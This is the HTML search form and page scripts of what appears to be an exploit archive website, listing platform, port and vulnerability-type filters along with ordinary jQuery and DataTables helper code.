                                
                                    <option value="nodejs" >
                                        NodeJS
                                    </option>

                                
                                    <option value="alpha" >
                                        Alpha
                                    </option>

                                
                                    <option value="solaris_mips" >
                                        Solaris_MIPS
                                    </option>

                                
                                    <option value="lua" >
                                        Lua
                                    </option>

                                
                                    <option value="watchos" >
                                        watchOS
                                    </option>

                                
                                    <option value="vxworks" >
                                        VxWorks
                                    </option>

                                
                                    <option value="python2" >
                                        Python2
                                    </option>

                                
                                    <option value="python3" >
                                        Python3
                                    </option>

                                
                            </select>

                        </div>

                        <div class="col-sm-6 col-lg-4">

                            <div class="form-group">

                                <label for="authorSearch" class="text-primary">Author</label>

                                <input id="authorSearch" class="form-control" type="text" name="e_author"
                                       placeholder="Author" value="">

                            </div>
                        </div>

                    </div>

                    <div class="row">

                        <div class="col-sm-12 col-lg-6">

                            <div class="form-group">

                                <label for="textSearch" class="control-label text-primary">Content</label>

                                <input id="textSearch" class="form-control" type="text" name="text"
                                       placeholder="Exploit content" value="">

                            </div>

                        </div>

                        <div class="col-sm-6 col-lg-2">

                            <label for="portSearchSelect" class="text-primary">Port</label>

                            <select id="portSearchSelect" name="port" class="form-control">

                                <option></option>
                                
                                    <option value="14" >
                                        14
                                    </option>


                                
                                    <option value="21" >
                                        21
                                    </option>


                                
                                    <option value="22" >
                                        22
                                    </option>


                                
                                    <option value="23" >
                                        23
                                    </option>


                                
                                    <option value="25" >
                                        25
                                    </option>


                                
                                    <option value="42" >
                                        42
                                    </option>


                                
                                    <option value="49" >
                                        49
                                    </option>


                                
                                    <option value="53" >
                                        53
                                    </option>


                                
                                    <option value="66" >
                                        66
                                    </option>


                                
                                    <option value="69" >
                                        69
                                    </option>


                                
                                    <option value="70" >
                                        70
                                    </option>


                                
                                    <option value="79" >
                                        79
                                    </option>


                                
                                    <option value="80" >
                                        80
                                    </option>


                                
                                    <option value="81" >
                                        81
                                    </option>


                                
                                    <option value="102" >
                                        102
                                    </option>


                                
                                    <option value="105" >
                                        105
                                    </option>


                                
                                    <option value="110" >
                                        110
                                    </option>


                                
                                    <option value="111" >
                                        111
                                    </option>


                                
                                    <option value="113" >
                                        113
                                    </option>


                                
                                    <option value="119" >
                                        119
                                    </option>


                                
                                    <option value="123" >
                                        123
                                    </option>


                                
                                    <option value="135" >
                                        135
                                    </option>


                                
                                    <option value="139" >
                                        139
                                    </option>


                                
                                    <option value="143" >
                                        143
                                    </option>


                                
                                    <option value="161" >
                                        161
                                    </option>


                                
                                    <option value="162" >
                                        162
                                    </option>


                                
                                    <option value="164" >
                                        164
                                    </option>


                                
                                    <option value="383" >
                                        383
                                    </option>


                                
                                    <option value="389" >
                                        389
                                    </option>


                                
                                    <option value="402" >
                                        402
                                    </option>


                                
                                    <option value="406" >
                                        406
                                    </option>


                                
                                    <option value="411" >
                                        411
                                    </option>


                                
                                    <option value="443" >
                                        443
                                    </option>


                                
                                    <option value="444" >
                                        444
                                    </option>


                                
                                    <option value="445" >
                                        445
                                    </option>


                                
                                    <option value="446" >
                                        446
                                    </option>


                                
                                    <option value="502" >
                                        502
                                    </option>


                                
                                    <option value="504" >
                                        504
                                    </option>


                                
                                    <option value="513" >
                                        513
                                    </option>


                                
                                    <option value="514" >
                                        514
                                    </option>


                                
                                    <option value="515" >
                                        515
                                    </option>


                                
                                    <option value="532" >
                                        532
                                    </option>


                                
                                    <option value="548" >
                                        548
                                    </option>


                                
                                    <option value="554" >
                                        554
                                    </option>


                                
                                    <option value="555" >
                                        555
                                    </option>


                                
                                    <option value="617" >
                                        617
                                    </option>


                                
                                    <option value="623" >
                                        623
                                    </option>


                                
                                    <option value="631" >
                                        631
                                    </option>


                                
                                    <option value="655" >
                                        655
                                    </option>


                                
                                    <option value="689" >
                                        689
                                    </option>


                                
                                    <option value="783" >
                                        783
                                    </option>


                                
                                    <option value="787" >
                                        787
                                    </option>


                                
                                    <option value="808" >
                                        808
                                    </option>


                                
                                    <option value="873" >
                                        873
                                    </option>


                                
                                    <option value="888" >
                                        888
                                    </option>


                                
                                    <option value="901" >
                                        901
                                    </option>


                                
                                    <option value="998" >
                                        998
                                    </option>


                                
                                    <option value="1000" >
                                        1000
                                    </option>


                                
                                    <option value="1040" >
                                        1040
                                    </option>


                                
                                    <option value="1089" >
                                        1089
                                    </option>


                                
                                    <option value="1099" >
                                        1099
                                    </option>


                                
                                    <option value="1100" >
                                        1100
                                    </option>


                                
                                    <option value="1114" >
                                        1114
                                    </option>


                                
                                    <option value="1120" >
                                        1120
                                    </option>


                                
                                    <option value="1194" >
                                        1194
                                    </option>


                                
                                    <option value="1235" >
                                        1235
                                    </option>


                                
                                    <option value="1471" >
                                        1471
                                    </option>


                                
                                    <option value="1521" >
                                        1521
                                    </option>


                                
                                    <option value="1533" >
                                        1533
                                    </option>


                                
                                    <option value="1581" >
                                        1581
                                    </option>


                                
                                    <option value="1589" >
                                        1589
                                    </option>


                                
                                    <option value="1604" >
                                        1604
                                    </option>


                                
                                    <option value="1617" >
                                        1617
                                    </option>


                                
                                    <option value="1723" >
                                        1723
                                    </option>


                                
                                    <option value="1743" >
                                        1743
                                    </option>


                                
                                    <option value="1761" >
                                        1761
                                    </option>


                                
                                    <option value="1812" >
                                        1812
                                    </option>


                                
                                    <option value="1858" >
                                        1858
                                    </option>


                                
                                    <option value="1861" >
                                        1861
                                    </option>


                                
                                    <option value="1900" >
                                        1900
                                    </option>


                                
                                    <option value="1947" >
                                        1947
                                    </option>


                                
                                    <option value="2000" >
                                        2000
                                    </option>


                                
                                    <option value="2022" >
                                        2022
                                    </option>


                                
                                    <option value="2049" >
                                        2049
                                    </option>


                                
                                    <option value="2100" >
                                        2100
                                    </option>


                                
                                    <option value="2103" >
                                        2103
                                    </option>


                                
                                    <option value="2121" >
                                        2121
                                    </option>


                                
                                    <option value="2125" >
                                        2125
                                    </option>


                                
                                    <option value="2181" >
                                        2181
                                    </option>


                                
                                    <option value="2242" >
                                        2242
                                    </option>


                                
                                    <option value="2315" >
                                        2315
                                    </option>


                                
                                    <option value="2375" >
                                        2375
                                    </option>


                                
                                    <option value="2380" >
                                        2380
                                    </option>


                                
                                    <option value="2381" >
                                        2381
                                    </option>


                                
                                    <option value="2401" >
                                        2401
                                    </option>


                                
                                    <option value="2480" >
                                        2480
                                    </option>


                                
                                    <option value="2525" >
                                        2525
                                    </option>


                                
                                    <option value="2640" >
                                        2640
                                    </option>


                                
                                    <option value="2810" >
                                        2810
                                    </option>


                                
                                    <option value="2812" >
                                        2812
                                    </option>


                                
                                    <option value="2947" >
                                        2947
                                    </option>


                                
                                    <option value="2954" >
                                        2954
                                    </option>


                                
                                    <option value="2990" >
                                        2990
                                    </option>


                                
                                    <option value="3000" >
                                        3000
                                    </option>


                                
                                    <option value="3030" >
                                        3030
                                    </option>


                                
                                    <option value="3050" >
                                        3050
                                    </option>


                                
                                    <option value="3052" >
                                        3052
                                    </option>


                                
                                    <option value="3128" >
                                        3128
                                    </option>


                                
                                    <option value="3129" >
                                        3129
                                    </option>


                                
                                    <option value="3181" >
                                        3181
                                    </option>


                                
                                    <option value="3200" >
                                        3200
                                    </option>


                                
                                    <option value="3217" >
                                        3217
                                    </option>


                                
                                    <option value="3306" >
                                        3306
                                    </option>


                                
                                    <option value="3333" >
                                        3333
                                    </option>


                                
                                    <option value="3378" >
                                        3378
                                    </option>


                                
                                    <option value="3389" >
                                        3389
                                    </option>


                                
                                    <option value="3460" >
                                        3460
                                    </option>


                                
                                    <option value="3465" >
                                        3465
                                    </option>


                                
                                    <option value="3500" >
                                        3500
                                    </option>


                                
                                    <option value="3535" >
                                        3535
                                    </option>


                                
                                    <option value="3632" >
                                        3632
                                    </option>


                                
                                    <option value="3690" >
                                        3690
                                    </option>


                                
                                    <option value="3790" >
                                        3790
                                    </option>


                                
                                    <option value="3814" >
                                        3814
                                    </option>


                                
                                    <option value="3817" >
                                        3817
                                    </option>


                                
                                    <option value="4000" >
                                        4000
                                    </option>


                                
                                    <option value="4002" >
                                        4002
                                    </option>


                                
                                    <option value="4070" >
                                        4070
                                    </option>


                                
                                    <option value="4081" >
                                        4081
                                    </option>


                                
                                    <option value="4105" >
                                        4105
                                    </option>


                                
                                    <option value="4111" >
                                        4111
                                    </option>


                                
                                    <option value="4322" >
                                        4322
                                    </option>


                                
                                    <option value="4343" >
                                        4343
                                    </option>


                                
                                    <option value="4434" >
                                        4434
                                    </option>


                                
                                    <option value="4501" >
                                        4501
                                    </option>


                                
                                    <option value="4555" >
                                        4555
                                    </option>


                                
                                    <option value="4592" >
                                        4592
                                    </option>


                                
                                    <option value="4661" >
                                        4661
                                    </option>


                                
                                    <option value="4750" >
                                        4750
                                    </option>


                                
                                    <option value="4848" >
                                        4848
                                    </option>


                                
                                    <option value="5000" >
                                        5000
                                    </option>


                                
                                    <option value="5060" >
                                        5060
                                    </option>


                                
                                    <option value="5061" >
                                        5061
                                    </option>


                                
                                    <option value="5080" >
                                        5080
                                    </option>


                                
                                    <option value="5081" >
                                        5081
                                    </option>


                                
                                    <option value="5093" >
                                        5093
                                    </option>


                                
                                    <option value="5151" >
                                        5151
                                    </option>


                                
                                    <option value="5180" >
                                        5180
                                    </option>


                                
                                    <option value="5247" >
                                        5247
                                    </option>


                                
                                    <option value="5250" >
                                        5250
                                    </option>


                                
                                    <option value="5272" >
                                        5272
                                    </option>


                                
                                    <option value="5308" >
                                        5308
                                    </option>


                                
                                    <option value="5432" >
                                        5432
                                    </option>


                                
                                    <option value="5466" >
                                        5466
                                    </option>


                                
                                    <option value="5554" >
                                        5554
                                    </option>


                                
                                    <option value="5555" >
                                        5555
                                    </option>


                                
                                    <option value="5600" >
                                        5600
                                    </option>


                                
                                    <option value="5655" >
                                        5655
                                    </option>


                                
                                    <option value="5666" >
                                        5666
                                    </option>


                                
                                    <option value="5800" >
                                        5800
                                    </option>


                                
                                    <option value="5803" >
                                        5803
                                    </option>


                                
                                    <option value="5814" >
                                        5814
                                    </option>


                                
                                    <option value="5858" >
                                        5858
                                    </option>


                                
                                    <option value="5900" >
                                        5900
                                    </option>


                                
                                    <option value="5984" >
                                        5984
                                    </option>


                                
                                    <option value="6066" >
                                        6066
                                    </option>


                                
                                    <option value="6070" >
                                        6070
                                    </option>


                                
                                    <option value="6080" >
                                        6080
                                    </option>


                                
                                    <option value="6082" >
                                        6082
                                    </option>


                                
                                    <option value="6101" >
                                        6101
                                    </option>


                                
                                    <option value="6112" >
                                        6112
                                    </option>


                                
                                    <option value="6129" >
                                        6129
                                    </option>


                                
                                    <option value="6379" >
                                        6379
                                    </option>


                                
                                    <option value="6502" >
                                        6502
                                    </option>


                                
                                    <option value="6503" >
                                        6503
                                    </option>


                                
                                    <option value="6660" >
                                        6660
                                    </option>


                                
                                    <option value="6667" >
                                        6667
                                    </option>


                                
                                    <option value="7001" >
                                        7001
                                    </option>


                                
                                    <option value="7002" >
                                        7002
                                    </option>


                                
                                    <option value="7070" >
                                        7070
                                    </option>


                                
                                    <option value="7071" >
                                        7071
                                    </option>


                                
                                    <option value="7080" >
                                        7080
                                    </option>


                                
                                    <option value="7100" >
                                        7100
                                    </option>


                                
                                    <option value="7144" >
                                        7144
                                    </option>


                                
                                    <option value="7210" >
                                        7210
                                    </option>


                                
                                    <option value="7272" >
                                        7272
                                    </option>


                                
                                    <option value="7290" >
                                        7290
                                    </option>


                                
                                    <option value="7426" >
                                        7426
                                    </option>


                                
                                    <option value="7443" >
                                        7443
                                    </option>


                                
                                    <option value="7510" >
                                        7510
                                    </option>


                                
                                    <option value="7547" >
                                        7547
                                    </option>


                                
                                    <option value="7649" >
                                        7649
                                    </option>


                                
                                    <option value="7770" >
                                        7770
                                    </option>


                                
                                    <option value="7777" >
                                        7777
                                    </option>


                                
                                    <option value="7778" >
                                        7778
                                    </option>


                                
                                    <option value="7787" >
                                        7787
                                    </option>


                                
                                    <option value="7879" >
                                        7879
                                    </option>


                                
                                    <option value="7902" >
                                        7902
                                    </option>


                                
                                    <option value="8000" >
                                        8000
                                    </option>


                                
                                    <option value="8001" >
                                        8001
                                    </option>


                                
                                    <option value="8002" >
                                        8002
                                    </option>


                                
                                    <option value="8004" >
                                        8004
                                    </option>


                                
                                    <option value="8008" >
                                        8008
                                    </option>


                                
                                    <option value="8020" >
                                        8020
                                    </option>


                                
                                    <option value="8022" >
                                        8022
                                    </option>


                                
                                    <option value="8023" >
                                        8023
                                    </option>


                                
                                    <option value="8028" >
                                        8028
                                    </option>


                                
                                    <option value="8030" >
                                        8030
                                    </option>


                                
                                    <option value="8080" >
                                        8080
                                    </option>


                                
                                    <option value="8081" >
                                        8081
                                    </option>


                                
                                    <option value="8082" >
                                        8082
                                    </option>


                                
                                    <option value="8088" >
                                        8088
                                    </option>


                                
                                    <option value="8090" >
                                        8090
                                    </option>


                                
                                    <option value="8181" >
                                        8181
                                    </option>


                                
                                    <option value="8300" >
                                        8300
                                    </option>


                                
                                    <option value="8400" >
                                        8400
                                    </option>


                                
                                    <option value="8443" >
                                        8443
                                    </option>


                                
                                    <option value="8445" >
                                        8445
                                    </option>


                                
                                    <option value="8473" >
                                        8473
                                    </option>


                                
                                    <option value="8500" >
                                        8500
                                    </option>


                                
                                    <option value="8585" >
                                        8585
                                    </option>


                                
                                    <option value="8619" >
                                        8619
                                    </option>


                                
                                    <option value="8800" >
                                        8800
                                    </option>


                                
                                    <option value="8812" >
                                        8812
                                    </option>


                                
                                    <option value="8839" >
                                        8839
                                    </option>


                                
                                    <option value="8880" >
                                        8880
                                    </option>


                                
                                    <option value="8888" >
                                        8888
                                    </option>


                                
                                    <option value="9000" >
                                        9000
                                    </option>


                                
                                    <option value="9001" >
                                        9001
                                    </option>


                                
                                    <option value="9002" >
                                        9002
                                    </option>


                                
                                    <option value="9080" >
                                        9080
                                    </option>


                                
                                    <option value="9090" >
                                        9090
                                    </option>


                                
                                    <option value="9091" >
                                        9091
                                    </option>


                                
                                    <option value="9100" >
                                        9100
                                    </option>


                                
                                    <option value="9124" >
                                        9124
                                    </option>


                                
                                    <option value="9200" >
                                        9200
                                    </option>


                                
                                    <option value="9251" >
                                        9251
                                    </option>


                                
                                    <option value="9256" >
                                        9256
                                    </option>


                                
                                    <option value="9443" >
                                        9443
                                    </option>


                                
                                    <option value="9447" >
                                        9447
                                    </option>


                                
                                    <option value="9784" >
                                        9784
                                    </option>


                                
                                    <option value="9788" >
                                        9788
                                    </option>


                                
                                    <option value="9855" >
                                        9855
                                    </option>


                                
                                    <option value="9876" >
                                        9876
                                    </option>


                                
                                    <option value="9900" >
                                        9900
                                    </option>


                                
                                    <option value="9987" >
                                        9987
                                    </option>


                                
                                    <option value="9993" >
                                        9993
                                    </option>


                                
                                    <option value="9999" >
                                        9999
                                    </option>


                                
                                    <option value="10000" >
                                        10000
                                    </option>


                                
                                    <option value="10001" >
                                        10001
                                    </option>


                                
                                    <option value="10080" >
                                        10080
                                    </option>


                                
                                    <option value="10202" >
                                        10202
                                    </option>


                                
                                    <option value="10203" >
                                        10203
                                    </option>


                                
                                    <option value="10443" >
                                        10443
                                    </option>


                                
                                    <option value="10616" >
                                        10616
                                    </option>


                                
                                    <option value="11000" >
                                        11000
                                    </option>


                                
                                    <option value="11211" >
                                        11211
                                    </option>


                                
                                    <option value="11460" >
                                        11460
                                    </option>


                                
                                    <option value="12203" >
                                        12203
                                    </option>


                                
                                    <option value="12221" >
                                        12221
                                    </option>


                                
                                    <option value="12345" >
                                        12345
                                    </option>


                                
                                    <option value="12397" >
                                        12397
                                    </option>


                                
                                    <option value="12401" >
                                        12401
                                    </option>


                                
                                    <option value="13327" >
                                        13327
                                    </option>


                                
                                    <option value="13701" >
                                        13701
                                    </option>


                                
                                    <option value="13722" >
                                        13722
                                    </option>


                                
                                    <option value="13838" >
                                        13838
                                    </option>


                                
                                    <option value="16992" >
                                        16992
                                    </option>


                                
                                    <option value="18821" >
                                        18821
                                    </option>


                                
                                    <option value="18881" >
                                        18881
                                    </option>


                                
                                    <option value="19000" >
                                        19000
                                    </option>


                                
                                    <option value="19810" >
                                        19810
                                    </option>


                                
                                    <option value="19813" >
                                        19813
                                    </option>


                                
                                    <option value="20000" >
                                        20000
                                    </option>


                                
                                    <option value="20002" >
                                        20002
                                    </option>


                                
                                    <option value="20010" >
                                        20010
                                    </option>


                                
                                    <option value="20031" >
                                        20031
                                    </option>


                                
                                    <option value="20111" >
                                        20111
                                    </option>


                                
                                    <option value="20171" >
                                        20171
                                    </option>


                                
                                    <option value="22003" >
                                        22003
                                    </option>


                                
                                    <option value="23423" >
                                        23423
                                    </option>


                                
                                    <option value="25672" >
                                        25672
                                    </option>


                                
                                    <option value="26000" >
                                        26000
                                    </option>


                                
                                    <option value="27015" >
                                        27015
                                    </option>


                                
                                    <option value="27700" >
                                        27700
                                    </option>


                                
                                    <option value="28015" >
                                        28015
                                    </option>


                                
                                    <option value="30000" >
                                        30000
                                    </option>


                                
                                    <option value="30303" >
                                        30303
                                    </option>


                                
                                    <option value="31337" >
                                        31337
                                    </option>


                                
                                    <option value="32400" >
                                        32400
                                    </option>


                                
                                    <option value="32674" >
                                        32674
                                    </option>


                                
                                    <option value="32764" >
                                        32764
                                    </option>


                                
                                    <option value="34205" >
                                        34205
                                    </option>


                                
                                    <option value="37215" >
                                        37215
                                    </option>


                                
                                    <option value="37777" >
                                        37777
                                    </option>


                                
                                    <option value="37848" >
                                        37848
                                    </option>


                                
                                    <option value="38292" >
                                        38292
                                    </option>


                                
                                    <option value="40007" >
                                        40007
                                    </option>


                                
                                    <option value="41523" >
                                        41523
                                    </option>


                                
                                    <option value="44334" >
                                        44334
                                    </option>


                                
                                    <option value="46824" >
                                        46824
                                    </option>


                                
                                    <option value="48080" >
                                        48080
                                    </option>


                                
                                    <option value="49152" >
                                        49152
                                    </option>


                                
                                    <option value="50000" >
                                        50000
                                    </option>


                                
                                    <option value="50496" >
                                        50496
                                    </option>


                                
                                    <option value="52311" >
                                        52311
                                    </option>


                                
                                    <option value="52789" >
                                        52789
                                    </option>


                                
                                    <option value="52869" >
                                        52869
                                    </option>


                                
                                    <option value="52986" >
                                        52986
                                    </option>


                                
                                    <option value="53413" >
                                        53413
                                    </option>


                                
                                    <option value="54345" >
                                        54345
                                    </option>


                                
                                    <option value="54890" >
                                        54890
                                    </option>


                                
                                    <option value="55554" >
                                        55554
                                    </option>


                                
                                    <option value="55555" >
                                        55555
                                    </option>


                                
                                    <option value="56380" >
                                        56380
                                    </option>


                                
                                    <option value="57772" >
                                        57772
                                    </option>


                                
                                    <option value="58080" >
                                        58080
                                    </option>


                                
                                    <option value="62514" >
                                        62514
                                    </option>


                                
                            </select>

                        </div>

                        <div class="col-sm-6 col-lg-4">

                            <label for="tagSearchSelect" class="text-primary">Tag</label>

                            <select id="tagSearchSelect" name="tag" class="form-control">

                                <option></option>
                                
                                    <option value="1" >
                                        WordPress Core
                                    </option>


                                
                                    <option value="3" >
                                        Metasploit Framework (MSF)
                                    </option>


                                
                                    <option value="4" >
                                        WordPress Plugin
                                    </option>


                                
                                    <option value="7" >
                                        SQL Injection (SQLi)
                                    </option>


                                
                                    <option value="8" >
                                        Cross-Site Scripting (XSS)
                                    </option>


                                
                                    <option value="9" >
                                        File Inclusion (LFI/RFI)
                                    </option>


                                
                                    <option value="12" >
                                        Cross-Site Request Forgery (CSRF)
                                    </option>


                                
                                    <option value="13" >
                                        Denial of Service (DoS)
                                    </option>


                                
                                    <option value="14" >
                                        Code Injection
                                    </option>


                                
                                    <option value="15" >
                                        Command Injection
                                    </option>


                                
                                    <option value="16" >
                                        Authentication Bypass / Credentials Bypass (AB/CB)
                                    </option>


                                
                                    <option value="18" >
                                        Client Side
                                    </option>


                                
                                    <option value="19" >
                                        Use After Free (UAF)
                                    </option>


                                
                                    <option value="20" >
                                        Out Of Bounds
                                    </option>


                                
                                    <option value="21" >
                                        Remote
                                    </option>


                                
                                    <option value="22" >
                                        Local
                                    </option>


                                
                                    <option value="23" >
                                        XML External Entity (XXE)
                                    </option>


                                
                                    <option value="24" >
                                        Integer Overflow
                                    </option>


                                
                                    <option value="25" >
                                        Server-Side Request Forgery (SSRF)
                                    </option>


                                
                                    <option value="26" >
                                        Race Condition
                                    </option>


                                
                                    <option value="27" >
                                        NULL Pointer Dereference
                                    </option>


                                
                                    <option value="28" >
                                        Malware
                                    </option>


                                
                                    <option value="31" >
                                        Buffer Overflow
                                    </option>


                                
                                    <option value="34" >
                                        Heap Overflow
                                    </option>


                                
                                    <option value="35" >
                                        Type Confusion
                                    </option>


                                
                                    <option value="36" >
                                        Object Injection
                                    </option>


                                
                                    <option value="37" >
                                        Bug Report
                                    </option>


                                
                                    <option value="38" >
                                        Console
                                    </option>


                                
                                    <option value="39" >
                                        Pwn2Own
                                    </option>


                                
                                    <option value="40" >
                                        Traversal
                                    </option>


                                
                                    <option value="41" >
                                        Deserialization
                                    </option>


                                
                            </select>

                        </div>

                    </div>

                    <div class="row">

                        <div class="col-12">

                            <div class="form-check form-check-inline">

                                <label class="form-check-label text-primary">

                                    <input class="form-check-input" type="checkbox"
                                           name="verified" value="true"
                                           id="verifiedSearchCheck"   >
                                    Verified

                                    <span class="form-check-sign">
                                        <span class="check"></span>
                                    </span>

                                </label>

                            </div>

                            <div class="form-check form-check-inline">

                                <label class="form-check-label text-primary">
                                    <input class="form-check-input" type="checkbox"
                                           name="hasapp" value="true"
                                           id="hasappSearchCheck" >
                                    Has App

                                    <span class="form-check-sign">
                                        <span class="check"></span>
                                    </span>

                                </label>

                            </div>

                            <div class="form-check form-check-inline">

                                <label class="form-check-label text-primary">
                                    <input class="form-check-input" type="checkbox"
                                           name="nomsf" value="true"
                                           id="nomsfCheck" >
                                    No Metasploit

                                    <span class="form-check-sign">
                                        <span class="check"></span>
                                    </span>

                                </label>

                            </div>

                        </div>

                    </div>

                    <div class="row">

                        <div class="col-12">

                            <button type="submit" class="btn btn-primary float-right">Search</button>

                        </div>

                    </div>

                </form>


            </div>

        </div>

    </div>

</div>

</footer>

    </div>

</div>

</body>

<!--   Make the default DataTables search field larger   -->
<style type="text/css">
    .dataTables_filter input {
        font-size: 16px;
    }
</style>

<!--   Core JS Files   -->
<script src="/js/core/jquery.min.js"></script>
<script src="/js/core/popper.min.js"></script>
<script src="/js/core/bootstrap.min.js"></script>

<script src="/js/plugins/perfect-scrollbar.jquery.min.js"></script>
<script src="/js/plugins/moment.min.js"></script>

<!-- Forms Validations Plugin -->
<script src="/js/plugins/jquery.validate.min.js"></script>

<!--  DataTables.net Plugin, full documentation here:
https://datatables.net/    -->
<script src="/js/plugins/jquery.dataTables.min.js"></script>

<!--  Notifications Plugin    -->
<script src="/js/plugins/bootstrap-notify.js"></script>

<!-- Control Center for Now Ui Dashboard: parallax effects,
scripts for the example pages etc -->
<script src="/js/now-ui-dashboard.js"></script>

<script src="/js/selectize.min.js"></script>

<script src="/js/app.js"></script>
<script src="/js/appfunctions.js"></script>


<script>
    window.addEventListener('popstate', () => {
        location.reload();
    }, false);

    $(function () {
        $('[data-toggle="tooltip"]').tooltip()
    })

    function getParameterByName(name, url) {
        if (!url) url = window.location.href;
        name = name.replace(/[\[\]]/g, "\\$&");
        var regex = new RegExp("[?&]" + name + "(=([^&#]*)|&|#|$)"),
            results = regex.exec(url);
        if (!results) return null;
        if (!results[2]) return '';
        return decodeURIComponent(results[2].replace(/\+/g, " "));
    }


    function removeURLParameter(url, parameter) {
        //prefer to use l.search if you have a location/link object
        var urlparts= url.split('?');
        if (urlparts.length>=2) {

            var prefix= encodeURIComponent(parameter)+'=';
            var pars= urlparts[1].split(/[&;]/g);

            //reverse iteration as may be destructive
            for (var i= pars.length; i-- > 0;) {
                //idiom for string.startsWith
                if (pars[i].lastIndexOf(prefix, 0) !== -1) {
                    pars.splice(i, 1);
                }
            }

            url= urlparts[0] + (pars.length > 0 ? '?' + pars.join('&') : "");
            window.history.pushState('', document.title, url);
            return url;
        } else {
            window.history.pushState('', document.title, url);
            return url;
        }
    }

    function showFilters() {
        var x = document.getElementById("exploitFiltersCard");
        if (x.style.display === "none") {
            x.style.display = "block";
        } else {
            x.style.display = "none";
        }
    }

    function updateQueryString(key, value, url) {
        if (!url) url = window.location.href;
        var re = new RegExp("([?&])" + key + "=.*?(&|#|$)(.*)", "gi"),
            hash;

        if (re.test(url)) {
            if (typeof value !== 'undefined' && value !== null)
                return url.replace(re, '$1' + key + "=" + value + '$2$3');
            else {
                hash = url.split('#');
                url = hash[0].replace(re, '$1$3').replace(/(&|\?)$/, '');
                if (typeof hash[1] !== 'undefined' && hash[1] !== null)
                    url += '#' + hash[1];

                window.history.pushState('', document.title, url);
                return url;
            }
        }
        else {
            if (typeof value !== 'undefined' && value !== null) {
                var separator = url.indexOf('?') !== -1 ? '&' : '?';
                hash = url.split('#');
                url = hash[0] + separator + key + '=' + value;
                if (typeof hash[1] !== 'undefined' && hash[1] !== null)
                    url += '#' + hash[1];

                window.history.pushState('', document.title, url);
                return url;
            }
            else
                window.history.pushState('', document.title, url);
                return url;
        }
    }

    $('#search').submit(function() {
        $(this).find(":input").filter(function(){ return !this.value; }).attr("disabled", "disabled");
        return true; // ensure form still submits
    });

    // Un-disable form fields when page loads, in case they click back after submission
    $('#search').find( ":input" ).prop( "disabled", false );

    // If the ajax call fails, throw the error to the console instead of
    // popping up an alert to the user
    $.fn.dataTable.ext.errMode = 'throw';

</script>

<!-- App scripts -->



</html>
